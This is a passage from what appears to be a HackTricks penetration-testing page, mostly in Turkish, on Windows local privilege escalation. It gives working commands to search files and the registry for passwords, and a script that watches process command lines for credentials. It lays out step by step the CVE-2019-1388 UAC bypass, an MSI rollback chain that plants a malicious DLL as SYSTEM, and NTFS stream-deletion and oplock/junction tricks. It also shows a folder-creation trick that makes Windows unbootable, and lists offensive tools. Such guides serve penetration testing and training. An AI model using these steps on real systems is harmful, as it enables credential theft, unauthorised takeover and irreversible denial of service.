Temelde, çalıştırılacak herhangi bir DLL'i **overwrite any of the DLLs** edebiliyorsanız, o DLL farklı bir kullanıcı tarafından çalıştırılacaksa **escalate privileges** elde edebilirsiniz.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Anahtar adları ve parolalar için kayıt defterinde ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Passwords arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf** için bir plugin'dir; bu plugin'i hedef içinde **credentials arayan tüm metasploit POST module'lerini otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen ve passwords içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden password çıkarmak için başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, verileri clear text olarak kaydeden (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) birkaç aracın **sessions**, **usernames** ve **passwords**'larını arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Düşünün ki **SYSTEM olarak çalışan bir process yeni bir process açıyor** (`OpenProcess()`) ve **tam erişim** veriyor. Aynı process **ayrıca düşük ayrıcalıklı ama ana processin tüm açık handle'larını miras alan yeni bir process oluşturuyor** (`CreateProcess()`).\
Sonra, eğer düşük ayrıcalıklı process'e **tam erişiminiz** varsa, `OpenProcess()` ile oluşturulmuş ayrıcalıklı process'e ait **açık handle'ı ele geçirebilir** ve **shellcode enjekte edebilirsiniz**.\
[Bu açığın **nasıl tespit edilip ve suistimal edileceği** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
[Daha kapsamlı bir açıklama ve farklı izin seviyeleriyle (sadece tam erişim değil) miras kalan process ve thread'lerin açık handler'larını nasıl test edip kötüye kullanacağınızı öğrenmek için bu **diğer gönderiyi** okuyun.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

Ortak bellek segmentleri, **pipes** olarak adlandırılan, süreçler arası iletişim ve veri aktarımını sağlar.

Windows, ilgisiz süreçlerin bile veri paylaşmasına izin veren **Named Pipes** adlı bir özellik sunar; bu farklı ağlar üzerinden bile olabilir. Bu, **named pipe server** ve **named pipe client** rollerinin tanımlandığı bir client/server mimarisine benzer.

Bir **client** tarafından bir pipe üzerinden veri gönderildiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahipse **client'ın kimliğini üstlenebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran bir **ayrıcalıklı process** tespit etmek, sizin oluşturduğunuz pipe ile etkileşime girdiklerinde o process'in kimliğini üstlenerek **daha yüksek ayrıcalıklar elde etme** imkânı sunar. Böyle bir saldırının nasıl gerçekleştirileceğine dair talimatlar için yararlı kılavuzlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulunabilir.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini intercept etmeye** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç tüm pipe'ları listeleyip inceleyerek privesc'leri bulmayı sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### Windows'ta kod çalıştırabilecek dosya uzantıları

Şu sayfaya bakın **[https://filesec.io/](https://filesec.io/)**

### **Parolalar için Komut Satırlarını İzleme**

Bir kullanıcı olarak shell elde ettiğinizde, komut satırında kimlik bilgilerini **geçen** zamanlanmış görevler veya başka süreçler çalışıyor olabilir. Aşağıdaki script, süreç komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktılar.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## İşlemlerden şifre çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminal ya da başka herhangi bir işlem çalıştırmak mümkündür.

Bu, aynı güvenlik açığı ile aynı anda ayrıcalık yükseltmeyi ve UAC bypass'ını mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve süreç sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen bazı sistemler şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığından yararlanmak için aşağıdaki adımların gerçekleştirilmesi gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı temelde Windows Installer'ın rollback özelliğinden yararlanarak meşru dosyaları kaldırma sürecinde kötü amaçlı olanlarla değiştirmeye dayanır. Bunun için saldırganın `C:\Config.Msi` klasörünü ele geçirmek amacıyla kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra diğer MSI paketlerinin uninstall işlemleri sırasında rollback dosyalarını burada depolayacaktır ve rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilmiştir.

Özet teknik şu şekildedir:

1. **Aşama 1 – Kaçırma İçin Hazırlık ( `C:\Config.Msi`'yi boş bırakın )**

- Adım 1: MSI'yı yükleyin
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) kuran bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin, böylece **non-admin user** çalıştırabilir.
- Yüklemeden sonra dosyaya bir **handle** açık bırakın.

- Adım 2: Kaldırma İşlemini Başlatın
- Aynı `.msi`'yı uninstall edin.
- Uninstall süreci dosyaları `C:\Config.Msi`'ye taşımaya ve onları `.rbf` dosyalarına yeniden adlandırmaya başlar (rollback yedekleri).
- Dosya `C:\Config.Msi\<random>.rbf` haline geldiğinde tespit etmek için `GetFinalPathNameByHandle` ile açık dosya handle'ını **poll** edin.

- Adım 3: Özel Senkronizasyon
- `.msi` içinde şu işi yapan bir **custom uninstall action (`SyncOnRbfWritten`)** bulunur:
- `.rbf` yazıldığında sinyal verir.
- Sonra uninstall'ın devam etmesinden önce başka bir event üzerinde **bekler**.

- Adım 4: `.rbf` Silinmesini Engelle
- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın silinmesini **önler**.
- Sonra uninstall'ın tamamlanabilmesi için **geri sinyal verin**.
- Windows Installer `.rbf`'yi silemez ve tüm içeriği silemediği için, **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf`'yi Manuel Olarak Silin
- Siz (saldırgan) `.rbf` dosyasını manuel olarak silin.
- Artık **`C:\Config.Msi` boş**, ele geçirilmek üzere hazır.

> Bu noktada, `C:\Config.Msi`'yi silmek için **SYSTEM-level arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: Zayıf ACL'lerle `C:\Config.Msi`'yi Yeniden Oluştur
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` ile bir handle açık tutun.

- Adım 7: Başka Bir Kurulum Çalıştırın
- `.msi`'yı tekrar kurun, şularla:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: zorunlu bir failure tetikleyecek bir değişken.
- Bu kurulum tekrar **rollback** tetikleyecek ve `.rbs` ve `.rbf` okunacaktır.

- Adım 8: `.rbs`'i İzleyin
- `ReadDirectoryChangesW` kullanarak `C:\Config.Msi`'yi yeni bir `.rbs` oluşana kadar izleyin.
- Dosya adını yakalayın.

- Adım 9: Rollback Öncesi Senkronizasyon
- `.msi` içinde şu işi yapan bir **custom install action (`SyncBeforeRollback`)** bulunur:
- `.rbs` oluşturulduğunda bir event ile sinyal verir.
- Sonra devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'yi Yeniden Uygula
- `.rbs oluşturuldu` event'ini aldıktan sonra:
- Windows Installer `C:\Config.Msi`'ye **güçlü ACL'ler** uygular.
- Ancak siz hala `WRITE_DAC` ile bir handle'a sahip olduğunuz için **yine zayıf ACL'ler** uygulayabilirsiniz.

> ACL'ler **sadece handle açıldığında** uygulanır, bu yüzden klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` Bırak
- `.rbs` dosyasını, Windows'a şunu söyleyen **sahte bir rollback script** ile overwrite edin:
- `.rbf` dosyanızı (kötü amaçlı DLL) bir **ayrıcalıklı konuma** geri yüklemesini (örn. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) söyleyin.
- Kötü amaçlı SYSTEM-seviyeli payload DLL içeren sahte `.rbf`'yi bırakın.

- Adım 12: Rollback'i Tetikle
- Installer'ın devam etmesi için sync event'ini sinyalleyin.
- Bilinen bir noktada kurulumu **bilerek başarısız** kılmak için yapılandırılmış bir **type 19 custom action (`ErrorOut`)** vardır.
- Bu, **rollback'in başlamasına** neden olur.

- Adım 13: SYSTEM DLL'inizi Yükler
- Windows Installer:
- Kötü amaçlı `.rbs`'inizi okur.
- Kötü amaçlı `.rbf` DLL'inizi hedef konuma kopyalar.
- Artık **SYSTEM tarafından yüklenen bir yolda kötü amaçlı DLL**'iniz var.

- Son Adım: SYSTEM Kodunu Çalıştır
- DLL'i yükleyecek güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Patlama**: Kodunuz **SYSTEM olarak** çalıştırılır.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Ana MSI rollback tekniği (öncekiler) tüm bir klasörü (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz sadece **keyfi dosya silme**ye izin veriyorsa?

NTFS içyapılarını suistimal edebilirsiniz: her klasörün şu adla gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata** bilgisini depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS dosya sisteminden **tüm klasörü kaldırır**.

Bunu standart dosya silme API'lerini kullanarak yapabilirsiniz, örneğin:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Her ne kadar *file* delete API çağırıyor olsanız da, bu **klasörün kendisini siler**.

### From Folder Contents Delete to SYSTEM EoP
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyorsa, ancak **attacker-controlled folder'ın *contents*'unu silmenize izin veriyorsa** ne olur?

1. Step 1: Tuzak klasör ve dosya oluşturma
- Oluştur: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerinde bir **oplock** yerleştirin
- Oplock, yetkili bir süreç `file1.txt`'i silmeye çalıştığında yürütmeyi **duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikleyin (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içindekileri silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock tetiklenir** ve kontrol callback'inize geçer.

4. Adım 4: oplock callback içinde – silmeyi yönlendirin

- Seçenek A: `file1.txt`'i başka bir yere taşıyın
- Bu, `folder1`'i oplock'u bozmadan boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu, oplock'u erken serbest bırakır.

- Seçenek B: `folder1`'i bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluştur:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS iç akışını hedef alır — onu silmek klasörü siler.

5. Adım 5: oplock'u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt`'i silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında şu an siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### From Arbitrary Folder Create to Permanent DoS

Bir primitive'i suistimal edin; bu size **create an arbitrary folder as SYSTEM/admin** oluşturma imkânı verir — hatta **dosyalara yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile.

Bir **klasör** (dosya değil) oluşturun; adı bir **kritik Windows sürücüsü** olan, e.g.:
```
C:\Windows\System32\cng.sys
```
- Bu yol genelde `cng.sys` çekirdek modu sürücüsüne karşılık gelir.
- Eğer bunu **bir klasör olarak önceden oluşturursanız**, Windows önyüklemede gerçek sürücüyü yükleyemez.
- Ardından, Windows önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözemeyerek başarısız olur** ve **çöker veya önyüklemeyi durdurur**.
- Harici müdahale olmadan (ör. önyükleme onarımı veya disk erişimi) **geri dönüş yok** ve **kurtarma mümkün değil**.


## **High Integrity'den SYSTEM'e**

### **Yeni servis**

Eğer zaten bir High Integrity süreci üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir servis oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Service binary oluştururken bunun geçerli bir service olduğundan veya ikili dosyanın gerekli eylemleri gerçekleştirdiğinden emin olun; aksi takdirde geçerli bir service değilse 20s içinde sonlandırılacaktır.

### AlwaysInstallElevated

High Integrity bir process üzerinden **AlwaysInstallElevated registry entries**'ı etkinleştirmeyi ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[Konu olan registry anahtarları ve bir _.msi_ paketinin nasıl kurulacağı hakkında daha fazla bilgi için buraya bakın.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen zaten High Integrity bir process içinde bulacaksınız), SeDebug ayrıcalığı ile **neredeyse herhangi bir process'i açabilir** (protected process değil), process'in **token'ını kopyalayabilir** ve o token ile **rastgele bir process oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan bir process'in seçilmesiyle** kullanılır (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Bir örnek kodu** [**buradan bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından getsystem yükseltmesi için kullanılır. Teknik, **bir pipe oluşturup sonra o pipe'a yazmak için bir service oluşturma/istismar etme** işlemine dayanır. Ardından, pipe'ı **`SeImpersonate`** ayrıcalığıyla oluşturan **server**, pipe istemcisinin (service'in) token'ını **taklit ederek** SYSTEM ayrıcalıkları elde edebilir.\
Eğer [**named pipes hakkında daha fazla bilgi edinmek isterseniz, burayı okuyun**](#named-pipe-client-impersonation).\
Named pipes kullanarak high integrity'den System'e nasıl geçileceğine dair bir örnek okumak isterseniz [**burayı okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

SYSTEM olarak çalışan bir **process** tarafından **yüklenen** bir **dll'i** hijack etmeyi başarırsanız, bu izinlerle keyfi kod çalıştırabilirsiniz. Bu yüzden Dll Hijacking bu tür privilege escalation için de yararlıdır ve ayrıca high integrity bir process'ten ulaşılması **çok daha kolaydır**, çünkü dll'lerin yüklendiği klasörler üzerinde **write permissions** olacaktır.\
**Daha fazla bilgi için** [**Dll hijacking hakkında buraya bakın**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Faydalı araçlar

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS/NBNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows keşfi**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen privesc zafiyetlerini arar (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Yönetici hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak host'ta bilgi toplar (privesc'den ziyade bilgi toplama aracı) (derlenmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol eder (çalıştırılabilir github'da önceden derlenmiş). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (doğru çalışması için accesschk'e ihtiyaç yoktur, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okuyup çalışacak exploitleri önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okuyup çalışacak exploitleri önerir (yerel python)

**Meterpreter**

multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümü ile derlemeniz gerekir ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban makinadaki yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
